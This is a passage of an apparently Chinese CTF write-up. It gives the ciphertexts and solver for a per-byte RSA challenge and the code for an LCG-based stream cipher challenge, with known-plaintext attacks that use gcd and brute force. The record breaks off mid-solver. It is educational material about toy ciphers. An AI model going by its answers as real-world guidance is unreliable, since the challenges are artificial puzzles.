10788595185853874250291337066031363719532165972152022247230756606168458513957901058267448230552069458296728306849344055365621140817689640272508695426725708991076683904959288139244667809213349187982089861290671799168933798128795390846176612821114516268881609010883097495433437815000067002681532459618320819014787645206016302741493146640426833757786432090306333486096069636012389767907433313022127305406871010623331311088179874132685290362909101935736195019027586102391508113258495217011090318875518809015771394328011308419705662015852545645365444877472509590058704853194148009194682279505412785412321259650082946504615, 12214375617150883559940273342436518138527218410934985237149587671322737062140339124492202696176206285958472333934156035036505400233023000788998092976741986863823811873410547405550567073962840347975520903121489290902307739798451416818132122393264618834099153283382832451251821941712321388307888964246791063446267500427470553498088671888609633794029303967713809269450664339834983016271666205923547989107632889053780602466856119056492479553825583500522541431263080790769404731164171222809033900244644945168321080041400080253195796277626702302011600707177094426992394860244220499600621143463468814032521658337756088059178]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>思路：分析加密可知，是对42个字节分别进行RSA加密，由于flag{}格式已知，相当于是已知六对明密文，而且是用同样的公钥(e,n)，对每一组密文有为了方便只取前五组():</p><script type="math/tex; mode=display">c_i=m_i^e(modn)->m_i^e=c_i+k_i*n\\-->k_in=m_i^e-c_i\quad(i=1...5)</script><p>可以看出五组的m^e-c有公因子n,可以通过求公因子求出n,但要注意，求出来的可能含有k的因子，如果是偶数的话可能是包含k的因子2，除以2才能得到真正的n，不然解出的flag会有点问题，不过这一题没有这个问题。求出n后，因为是一个字节一个字节的加密，一个字节只有256种可能，属于明文长度过短，可以爆破明文，如果加密的结果与密文相同则为正确明文。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br>mm=[<span class="hljs-number">11178083017120158485393153171321336735737665742302292934979041161712322853777963504034924245132451120396276345036538229147671518358660765304799250040930303751484684356497299279121270493349877825760899025782028810520758399698602445275900005376724413315814749226821845740911047145640269891147525197816867611230415112765918255699066836608409914573938366866985454497661337624781372075179438478859754556470114058222193424318436460835026378212119022319273767558996312244917841866269309038008770356601862132051758698846653499024264073556965771009943905699818566990849876593146220979938450848207655509499046815325530238201013</span>, <span class="hljs-number">4765275407078498830196453484615228647488119641051736386985124149771978793497825138811053264203464751611510602323328935055577934271194521578877734816701450882508975992711707365171446549350693616777156594559459359020681650457462997348341819337696857465215645867795933319433993806850657310771271780164857576249640499530706002807800072095279478191010627657160045263503510815828909783017871488780847009274255795618370702341262906675889960484872121593942090158785279482041251686692965598428699984795425424314845202821178882038752009686267978535447957338296568313474048161414021947114767992819220821921113419208368413263422</span>, <span class="hljs-number">8973390961455272052267628415841725148664014460598979414622203552505218520214743532403244304953555243556170777579306356620696458273374315586751949961843795539869690154234642403811934490726142262657134153207125693127589115572361182800281824586334537572060829713380809862704154400013755951085823840399392658480894558256977957471063971590417676730357273323411948303311010803091423319721802243327738203279168144733854954817333787104587761363460759530221526096663878048045665893439723821743634777948744336977023942482077160731957626238615947965693867523748036438735812823764360683309162662213075339182302561433502244315618</span>, <span class="hljs-number">15350733069829204402920295477711380341993062041251941490292749372749852236874047486052195072132113874647900550920373937658068265963230191744711614878751153046262497821806700880691844111230197714824626417009021627730693326236996457280638193712265028105287892407764356957055246585368960863525117367721015371334890353785285138290449449040298696396527786884238041078994224964407918419983364650072064009385080123333851106203047596834434300883391225870572762795102562384842292433334404864939630326550107936082575285024893679013349011338224644982643827594922553767254028893305803129888420355793710431322859736273982489816996</span>, <span class="hljs-number">4249373777588248671367805334161493007259542293334721053812535082529969776053394649471974449756301276663961653819139865824142355133200769538771524743248806027627082548193510500721182481899659358546225484367576894946375803888338888199469819956944303404505805643529314823810356948217197816571956131508907963784862292141456747364036520172036499072834743141526316790310038291316979993946838442642063654429242625413862965256433996723276080780358623683201705451079492393133681688362013434540679024214022109083304008364344767019959162604852916671072909369436496532197699383614425869981081966164258626590576379292275701825189</span>, <span class="hljs-number">9401060214549258780867450918103861209604366392595110616253971492712072807093676762513116729069961134692822329993124265319202569681734951489639750362495587511604130014388320210119485015682912857661569438869453461064645592515698096654390458164006539474719117791484865239857609116331892309674260247082059602317172440890843283496817642644771915908679655807549419934265866862482294562623188536733087520024628705700223770025012145610118039094670062134161738416393351131351835543201998903453963146138742920394324866685031697326269495493860930889537159592801704335425701164616224865573914639743121054125534708396412436553013</span>, <span class="hljs-number">19654595171654315158213936501048512290856391907074545164555633962365612472660258228301419361260282318699128465207796192578531872797199277705764911662741276841556125935317753083359300751109552146647391777837899540472601397813586411488753524464397475907518425178882776703281902159775206954942057948561706307293218080487445951237384356353793535370798514636293597528638968612324893712282419701312648224399984583358712458416093648210250912171230390790331796943208689964252106034986162388312208275122970182239540689210368540167180735615484225214910210233327467684273883519776106558578072694286638466552994831654174381044835</span>, <span class="hljs-number">12586368414462504168364503548096738036487124212221372385896911430340173088778701869880197508656426820249219033243643110919576113405502733741647603441861799338386166960793379007004326976331636726671678327723096989031175040175842132660361801404019157081982780533209209191684898550243133325744023235148128444797827700530022333796840703041794376197419484105959840037506283754168762791521384834681611428592723718488186668961106543585713067868583236342327870798104722263830332611193971063647485152444958590548147307308839615433262273629103560348967215405941605224987205474780900807897243644765401689814588719974234175057365</span>, <span class="hljs-number">9401060214549258780867450918103861209604366392595110616253971492712072807093676762513116729069961134692822329993124265319202569681734951489639750362495587511604130014388320210119485015682912857661569438869453461064645592515698096654390458164006539474719117791484865239857609116331892309674260247082059602317172440890843283496817642644771915908679655807549419934265866862482294562623188536733087520024628705700223770025012145610118039094670062134161738416393351131351835543201998903453963146138742920394324866685031697326269495493860930889537159592801704335425701164616224865573914639743121054125534708396412436553013</span>, <span class="hljs-number">3635275278635183549315022314865300211107333953729618262620788640006014274612765983632230202336333218753735628827913708368013373911993754752994660420696665597055513006156595151988934434020835871294494877212205850772549738485856720555285620770589013582496766873590818202601671885261630424587168761017486668153633265039658437266274931790905539730063394326439085221358298442653655228907783473187740098052820249826308157628672669593263612129847867064246914683866041495687954050237769621483628469862966415747065181757022201021890571077307495722753377609616728101524229243469807003327904966503543940968901246881814374519027</span>, <span class="hljs-number">12586368414462504168364503548096738036487124212221372385896911430340173088778701869880197508656426820249219033243643110919576113405502733741647603441861799338386166960793379007004326976331636726671678327723096989031175040175842132660361801404019157081982780533209209191684898550243133325744023235148128444797827700530022333796840703041794376197419484105959840037506283754168762791521384834681611428592723718488186668961106543585713067868583236342327870798104722263830332611193971063647485152444958590548147307308839615433262273629103560348967215405941605224987205474780900807897243644765401689814588719974234175057365</span>, <span class="hljs-number">19000555934585529305683392170381989320002451476828893690357718573608042557901262756594196097528218937377609939316690404016167547903158163914228535012281839169884103507554723850079193575039971117647459690537834051905504887886595023030085094604051410575710199490600927943831568523585523966550185816979665559642112504959207077847724745354761305124094475791537910083182441197600792102145078372769161366865835856070659742420903182775410372048316153156291377083922967959387384292365604396586364739015931010832012831735797525897307867227802077790973909455077192267492384110127651647949524981637309137897589614882856413134661</span>, <span class="hljs-number">17355773236729857323973342270052932822776443181350794115049274957572288992149418748086412749640634322969667852979516339666069836889497662051707223971996474107301073353349805595306420750337055575352283687879536718629164618796052047039628701931372309406301831041874201982276726848874988401287919319534744275696993626882472379524870013839308536247015281793879284940799318433542493865938111850258587184638110018166008717897412067757141722069237202689456423801977653539902597384820747728892037622013840313499223113832787246844644302233184877085683753398108033875101523308410923910391992192367470124409629413684235827401101</span>, <span class="hljs-number">5988814005927423051742841284846232770926892714804237210370833924883582993238775588414311949184741857401031544649891145694678063681407247979472513897586964785705292799172864840032527785183036435245506570222176909878479329653512536687095357488161992809108841328150782417871500850347317941663151826478971276116164594161843628645047495583925496045963556619654825292389779924078307705934624478150747059514480975484847842001684707512027593890811348416678576442403566393534185757661086090272237647255677876203901502038611852617062788350885720287280212225018848738512561583541592617803961183697178063513523789484758474251409</span>, <span class="hljs-number">8973390961455272052267628415841725148664014460598979414622203552505218520214743532403244304953555243556170777579306356620696458273374315586751949961843795539869690154234642403811934490726142262657134153207125693127589115572361182800281824586334537572060829713380809862704154400013755951085823840399392658480894558256977957471063971590417676730357273323411948303311010803091423319721802243327738203279168144733854954817333787104587761363460759530221526096663878048045665893439723821743634777948744336977023942482077160731957626238615947965693867523748036438735812823764360683309162662213075339182302561433502244315618</span>, <span class="hljs-number">3859959482980546272964041592677926326788734736813617460803112586887098470080689434694471240865737650206168444216169499393640775949766555842072533704694795133145770551685535438097745653486049958298857152048237100954025937597878134246565351033559913570963855392261375619388940130942631975527263102868836154113702012207407818544301966325323961143046903984302457861056914315343413937927125305404082933471280566632366457819963060445878461589707548495009155606847481503043605966599425677497274162192785494638975632832069752974461460132097911872311537539885671550638001598753535405480154079908206385289489275459229906552057</span>, <span class="hljs-number">19654595171654315158213936501048512290856391907074545164555633962365612472660258228301419361260282318699128465207796192578531872797199277705764911662741276841556125935317753083359300751109552146647391777837899540472601397813586411488753524464397475907518425178882776703281902159775206954942057948561706307293218080487445951237384356353793535370798514636293597528638968612324893712282419701312648224399984583358712458416093648210250912171230390790331796943208689964252106034986162388312208275122970182239540689210368540167180735615484225214910210233327467684273883519776106558578072694286638466552994831654174381044835</span>, <span class="hljs-number">19541389876845937343104174024011174738121582937765475620122801498154028082973444987539224097699623805950895389563205017470303467902732740685141223948133114441189902477943284761342153435208627535205000112301279059116718341374015808979933207842606066504198356735729482401379793585473914765882931794445052408034667492129524814885390117447168945036497206397204622589955300040717645565917707064969320291258722568342575672468731777880446082197946095551569690181986308352939371815648033417588567436731143727846893380585995821169243246578354856161235175509599914817583342574163019305560736028387187751212923707831738520468619</span>, <span class="hljs-number">5988814005927423051742841284846232770926892714804237210370833924883582993238775588414311949184741857401031544649891145694678063681407247979472513897586964785705292799172864840032527785183036435245506570222176909878479329653512536687095357488161992809108841328150782417871500850347317941663151826478971276116164594161843628645047495583925496045963556619654825292389779924078307705934624478150747059514480975484847842001684707512027593890811348416678576442403566393534185757661086090272237647255677876203901502038611852617062788350885720287280212225018848738512561583541592617803961183697178063513523789484758474251409</span>, <span class="hljs-number">10788595185853874250291337066031363719532165972152022247230756606168458513957901058267448230552069458296728306849344055365621140817689640272508695426725708991076683904959288139244667809213349187982089861290671799168933798128795390846176612821114516268881609010883097495433437815000067002681532459618320819014787645206016302741493146640426833757786432090306333486096069636012389767907433313022127305406871010623331311088179874132685290362909101935736195019027586102391508113258495217011090318875518809015771394328011308419705662015852545645365444877472509590058704853194148009194682279505412785412321259650082946504615</span>, <span class="hljs-number">11178083017120158485393153171321336735737665742302292934979041161712322853777963504034924245132451120396276345036538229147671518358660765304799250040930303751484684356497299279121270493349877825760899025782028810520758399698602445275900005376724413315814749226821845740911047145640269891147525197816867611230415112765918255699066836608409914573938366866985454497661337624781372075179438478859754556470114058222193424318436460835026378212119022319273767558996312244917841866269309038008770356601862132051758698846653499024264073556965771009943905699818566990849876593146220979938450848207655509499046815325530238201013</span>, <span class="hljs-number">11178083017120158485393153171321336735737665742302292934979041161712322853777963504034924245132451120396276345036538229147671518358660765304799250040930303751484684356497299279121270493349877825760899025782028810520758399698602445275900005376724413315814749226821845740911047145640269891147525197816867611230415112765918255699066836608409914573938366866985454497661337624781372075179438478859754556470114058222193424318436460835026378212119022319273767558996312244917841866269309038008770356601862132051758698846653499024264073556965771009943905699818566990849876593146220979938450848207655509499046815325530238201013</span>, <span class="hljs-number">12586368414462504168364503548096738036487124212221372385896911430340173088778701869880197508656426820249219033243643110919576113405502733741647603441861799338386166960793379007004326976331636726671678327723096989031175040175842132660361801404019157081982780533209209191684898550243133325744023235148128444797827700530022333796840703041794376197419484105959840037506283754168762791521384834681611428592723718488186668961106543585713067868583236342327870798104722263830332611193971063647485152444958590548147307308839615433262273629103560348967215405941605224987205474780900807897243644765401689814588719974234175057365</span>, <span class="hljs-number">5988814005927423051742841284846232770926892714804237210370833924883582993238775588414311949184741857401031544649891145694678063681407247979472513897586964785705292799172864840032527785183036435245506570222176909878479329653512536687095357488161992809108841328150782417871500850347317941663151826478971276116164594161843628645047495583925496045963556619654825292389779924078307705934624478150747059514480975484847842001684707512027593890811348416678576442403566393534185757661086090272237647255677876203901502038611852617062788350885720287280212225018848738512561583541592617803961183697178063513523789484758474251409</span>, <span class="hljs-number">1966051342253428126867036550911377588176062991978050151556220996966820367011493867712498963079481596568071731019471124371764175475269270008316413930914172651469330538676789619100982128052154168600577686568618368748109639619262262762578488936962488289364690039029892248888117290016845609036187623151577166054538068196197473606013134518323873786325904642286659354300685572005304468480149854980819019976872903106847397303566962121969346000684913201236927538303048221994495669917422710280271668440229600149250984619106386452760578946000175959652594393760857007932236451072213235889616254917671039080374828794956473992137</span>, <span class="hljs-number">3635275278635183549315022314865300211107333953729618262620788640006014274612765983632230202336333218753735628827913708368013373911993754752994660420696665597055513006156595151988934434020835871294494877212205850772549738485856720555285620770589013582496766873590818202601671885261630424587168761017486668153633265039658437266274931790905539730063394326439085221358298442653655228907783473187740098052820249826308157628672669593263612129847867064246914683866041495687954050237769621483628469862966415747065181757022201021890571077307495722753377609616728101524229243469807003327904966503543940968901246881814374519027</span>, <span class="hljs-number">11178083017120158485393153171321336735737665742302292934979041161712322853777963504034924245132451120396276345036538229147671518358660765304799250040930303751484684356497299279121270493349877825760899025782028810520758399698602445275900005376724413315814749226821845740911047145640269891147525197816867611230415112765918255699066836608409914573938366866985454497661337624781372075179438478859754556470114058222193424318436460835026378212119022319273767558996312244917841866269309038008770356601862132051758698846653499024264073556965771009943905699818566990849876593146220979938450848207655509499046815325530238201013</span>, <span class="hljs-number">8036115345158284474471397254807283266614614121743628483142557473269859898412290012891221484105977251019649903506196189946673222255281452613039087299351374625004810322992499276849659048953831983808571810413875419893692857244036929376849148890693973718372460762932593837217029662865217992090551413847287555846490173491344657373331793306347668493788788142206894611528091044960842285913251431599677455010357230713934669773980706349466425243400033937252603911175760751911576371407935700571967997143623735532177897923751597788914241916742615015830790145085701278392064206627458483137578085984012973561401653228823844995780</span>, <span class="hljs-number">5988814005927423051742841284846232770926892714804237210370833924883582993238775588414311949184741857401031544649891145694678063681407247979472513897586964785705292799172864840032527785183036435245506570222176909878479329653512536687095357488161992809108841328150782417871500850347317941663151826478971276116164594161843628645047495583925496045963556619654825292389779924078307705934624478150747059514480975484847842001684707512027593890811348416678576442403566393534185757661086090272237647255677876203901502038611852617062788350885720287280212225018848738512561583541592617803961183697178063513523789484758474251409</span>, <span class="hljs-number">11178083017120158485393153171321336735737665742302292934979041161712322853777963504034924245132451120396276345036538229147671518358660765304799250040930303751484684356497299279121270493349877825760899025782028810520758399698602445275900005376724413315814749226821845740911047145640269891147525197816867611230415112765918255699066836608409914573938366866985454497661337624781372075179438478859754556470114058222193424318436460835026378212119022319273767558996312244917841866269309038008770356601862132051758698846653499024264073556965771009943905699818566990849876593146220979938450848207655509499046815325530238201013</span>, <span class="hljs-number">9401060214549258780867450918103861209604366392595110616253971492712072807093676762513116729069961134692822329993124265319202569681734951489639750362495587511604130014388320210119485015682912857661569438869453461064645592515698096654390458164006539474719117791484865239857609116331892309674260247082059602317172440890843283496817642644771915908679655807549419934265866862482294562623188536733087520024628705700223770025012145610118039094670062134161738416393351131351835543201998903453963146138742920394324866685031697326269495493860930889537159592801704335425701164616224865573914639743121054125534708396412436553013</span>, <span class="hljs-number">3635275278635183549315022314865300211107333953729618262620788640006014274612765983632230202336333218753735628827913708368013373911993754752994660420696665597055513006156595151988934434020835871294494877212205850772549738485856720555285620770589013582496766873590818202601671885261630424587168761017486668153633265039658437266274931790905539730063394326439085221358298442653655228907783473187740098052820249826308157628672669593263612129847867064246914683866041495687954050237769621483628469862966415747065181757022201021890571077307495722753377609616728101524229243469807003327904966503543940968901246881814374519027</span>, <span class="hljs-number">7934100103612597799245966597540495770897459791305838611829168994366810176791478598127716585330973646572837963298347658217379594571851959822994361520143179602103117537841241957973806470431906980460647842956485908090628629220959042190163158423738015941306847049970180609905770726803957931803238333424331924772396704354166351537990669395857986219625312635050536080414161783157936667067773822631179948661311776327691342487942038364859476351251573618170116210483990759571565644168725706584601160447812736785763159328694343724189559744117144218446759634528879553618996488152154132459276180950902943439672009222655263294592</span>, <span class="hljs-number">1966051342253428126867036550911377588176062991978050151556220996966820367011493867712498963079481596568071731019471124371764175475269270008316413930914172651469330538676789619100982128052154168600577686568618368748109639619262262762578488936962488289364690039029892248888117290016845609036187623151577166054538068196197473606013134518323873786325904642286659354300685572005304468480149854980819019976872903106847397303566962121969346000684913201236927538303048221994495669917422710280271668440229600149250984619106386452760578946000175959652594393760857007932236451072213235889616254917671039080374828794956473992137</span>, <span class="hljs-number">12586368414462504168364503548096738036487124212221372385896911430340173088778701869880197508656426820249219033243643110919576113405502733741647603441861799338386166960793379007004326976331636726671678327723096989031175040175842132660361801404019157081982780533209209191684898550243133325744023235148128444797827700530022333796840703041794376197419484105959840037506283754168762791521384834681611428592723718488186668961106543585713067868583236342327870798104722263830332611193971063647485152444958590548147307308839615433262273629103560348967215405941605224987205474780900807897243644765401689814588719974234175057365</span>, <span class="hljs-number">10938776239912765586783245351675229316504975576866998685503586605561184435751049074246836816500718587784612469841616634843475000062466229478181842615745696699467399548336525284294887073685319159778641442405442489137290300401315830312684605395059339571269423637238744539444880428814659023673423480506866516527471293169451239948711899801093670224684408482463920460246668037760069839988494786949189538209188928839999072601239111365274070174948297336900113846678177315959484645286661230420476535393405982415166174713901838194389026469820973958391461098831028082983440806187768356311218898932776087634026785114354421118702</span>, <span class="hljs-number">9401060214549258780867450918103861209604366392595110616253971492712072807093676762513116729069961134692822329993124265319202569681734951489639750362495587511604130014388320210119485015682912857661569438869453461064645592515698096654390458164006539474719117791484865239857609116331892309674260247082059602317172440890843283496817642644771915908679655807549419934265866862482294562623188536733087520024628705700223770025012145610118039094670062134161738416393351131351835543201998903453963146138742920394324866685031697326269495493860930889537159592801704335425701164616224865573914639743121054125534708396412436553013</span>, <span class="hljs-number">19654595171654315158213936501048512290856391907074545164555633962365612472660258228301419361260282318699128465207796192578531872797199277705764911662741276841556125935317753083359300751109552146647391777837899540472601397813586411488753524464397475907518425178882776703281902159775206954942057948561706307293218080487445951237384356353793535370798514636293597528638968612324893712282419701312648224399984583358712458416093648210250912171230390790331796943208689964252106034986162388312208275122970182239540689210368540167180735615484225214910210233327467684273883519776106558578072694286638466552994831654174381044835</span>, <span class="hljs-number">9401060214549258780867450918103861209604366392595110616253971492712072807093676762513116729069961134692822329993124265319202569681734951489639750362495587511604130014388320210119485015682912857661569438869453461064645592515698096654390458164006539474719117791484865239857609116331892309674260247082059602317172440890843283496817642644771915908679655807549419934265866862482294562623188536733087520024628705700223770025012145610118039094670062134161738416393351131351835543201998903453963146138742920394324866685031697326269495493860930889537159592801704335425701164616224865573914639743121054125534708396412436553013</span>, <span class="hljs-number">19541389876845937343104174024011174738121582937765475620122801498154028082973444987539224097699623805950895389563205017470303467902732740685141223948133114441189902477943284761342153435208627535205000112301279059116718341374015808979933207842606066504198356735729482401379793585473914765882931794445052408034667492129524814885390117447168945036497206397204622589955300040717645565917707064969320291258722568342575672468731777880446082197946095551569690181986308352939371815648033417588567436731143727846893380585995821169243246578354856161235175509599914817583342574163019305560736028387187751212923707831738520468619</span>, <span class="hljs-number">10788595185853874250291337066031363719532165972152022247230756606168458513957901058267448230552069458296728306849344055365621140817689640272508695426725708991076683904959288139244667809213349187982089861290671799168933798128795390846176612821114516268881609010883097495433437815000067002681532459618320819014787645206016302741493146640426833757786432090306333486096069636012389767907433313022127305406871010623331311088179874132685290362909101935736195019027586102391508113258495217011090318875518809015771394328011308419705662015852545645365444877472509590058704853194148009194682279505412785412321259650082946504615</span>, <span class="hljs-number">12214375617150883559940273342436518138527218410934985237149587671322737062140339124492202696176206285958472333934156035036505400233023000788998092976741986863823811873410547405550567073962840347975520903121489290902307739798451416818132122393264618834099153283382832451251821941712321388307888964246791063446267500427470553498088671888609633794029303967713809269450664339834983016271666205923547989107632889053780602466856119056492479553825583500522541431263080790769404731164171222809033900244644945168321080041400080253195796277626702302011600707177094426992394860244220499600621143463468814032521658337756088059178</span>]<br>cc=<span class="hljs-string">&#x27;flag&#123;&#x27;</span><br>cc=<span class="hljs-built_in">list</span>(cc)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>cc[i]=<span class="hljs-built_in">ord</span>(cc[i])<br><span class="hljs-comment">#print(cc)</span><br>e=<span class="hljs-number">65537</span><br>aa=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>aa.append(<span class="hljs-built_in">pow</span>(cc[i],e)-mm[i])<br>x=gp.gcd(aa[<span class="hljs-number">0</span>],aa[<span class="hljs-number">1</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>x=gp.gcd(x,aa[i])<br><span class="hljs-comment">#print(x)</span><br>n=x<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">de</span>(<span class="hljs-params">c, e, n</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>    <span class="hljs-keyword">if</span> c==<span class="hljs-built_in">pow</span>(i,e,n):<br>    <span class="hljs-comment">#print(i)</span><br>    <span class="hljs-keyword">return</span> i<br><br>res=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">42</span>):<br>res+=<span class="hljs-built_in">chr</span>(de(mm[i],e,n))<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><h2 id="4-MyStream"><a href="#4-MyStream" class="headerlink" title="4.MyStream"></a>4.MyStream</h2><p>题目描述：My Stream Cipher System，Can you crack it？</p><p>提示：可以先做byteRSA，掌握攻击的方法</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>seed=getPrime(<span class="hljs-number">32</span>)<br>status=seed<br>n=getPrime(<span class="hljs-number">32</span>)<br>a,b=getPrime(<span class="hljs-number">16</span>),getPrime(<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stream_key</span>():<br>    <span class="hljs-keyword">global</span> status<br>    status = (a*status +b) %n<br>    tk=[]<br>    tmp=status<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        tk.append(tmp&amp;<span class="hljs-number">0xff</span>)<br>        tmp&gt;&gt;=<span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> tk<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encry</span>(<span class="hljs-params">m:<span class="hljs-built_in">str</span></span>):<br>    msg=[ <span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m]<br>    ll=<span class="hljs-built_in">len</span>(msg)//<span class="hljs-number">4</span> + <span class="hljs-number">1</span><br>    rk=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ll):<br>        rk.extend(stream_key())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(msg)):<br>        msg[i]^=rk[i]<br>    <span class="hljs-keyword">return</span>  b64encode(<span class="hljs-built_in">bytes</span>(msg))<br>m1=<span class="hljs-string">&#x27;TestAttackCrypto&#x27;</span><br>c1=encry(m1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Test my crypto system,when I encrypt <span class="hljs-subst">&#123;m1&#125;</span>, I get cipher is <span class="hljs-subst">&#123;c1&#125;</span>&#x27;</span>)<br>msg=flag.decode()<br>enc=encry(msg)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your flag is:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(enc))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Test my crypto system,when I encrypt TestAttackCrypto, I get cipher is b&#x27;2ufC/wJ0kSRD1HsWjMnqfg==&#x27;</span><br><span class="hljs-string">Your flag is:b&#x27;R/TOdy+8Glz/ub5d5eDWHq82FXIkfo8bUYs9YwsxLlcW1Sk2eOVIZBY3&#x27;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>分析加密脚本，发现加密做的事就是生成密钥流，与明文异或得到密文。密钥流的生成基于status变量，每四个密钥(一字节)基于同一个status，下一个status是由上一个status做线性变换得到的。</p><p>题目对加密了两组明文，给出了第一组明文的明密文对，后一组加密了flag,根据byteRSA的思路，应该是根据已知明密文的一组求出密钥(a,b,n,status),然后求出加密flag的密钥与密文异或即可得到flag</p><p>求解密钥：</p><p>由已知的明密文异或可以得到密钥(一个密钥即rk[i]是8bit,一个status是32bit),可以得到加密的4个status(x0,x1,x2,x3)</p><p>对4个status(x0,x1,x2,x3)有</p><script type="math/tex; mode=display">x_1=a*x_0+b(modn)->k_1*n=a*x_0+b-x_1\\x_2=a*x_1+b(modn)->k_2*n=a*x_1+b-x_2\\x_3=a*x_2+b(modn)->k_3*n=a*x_2+b-x_3</script><p>参考byteRSA的思路先通过公因子n，但这里的a,b是未知的，不过是16bit的素数，还是可以爆破的，可以过滤掉偶数会快很多，所以就是爆破a,b求三个式子的结果，求公因子，如果公因子达到32bit的长度，就是正确的n,不过要注意，公因子本质上是kn的公因子,如果最后求出的公因子是偶数，2可能是k的因子，除掉就行(不然flag肯定会有问题，会有几个字节不对)，这样就能求出a,b,n。</p><p>再通过一次线性变换求加密flag的初始的status:</p><script type="math/tex; mode=display">status=a*x_3+b(modn)</script><p>然后直接按加密过程生成密钥流异或，只不过是异或上密文就能解出明文</p><p>exp(求a,b,n,status):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode,b64decode<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s3gcd</span>(<span class="hljs-params">q,w,e</span>):<br>x0=GCD(q,w)<br>x0=GCD(x0,e)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(x0)[<span class="hljs-number">2</span>:])&gt;<span class="hljs-number">30</span>:<br><span class="hljs-keyword">return</span> x0<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>flag=<span class="hljs-number">0</span><br>xx=[<span class="hljs-number">2343666318</span>, <span class="hljs-number">1172635715</span>, <span class="hljs-number">1681440544</span>, <span 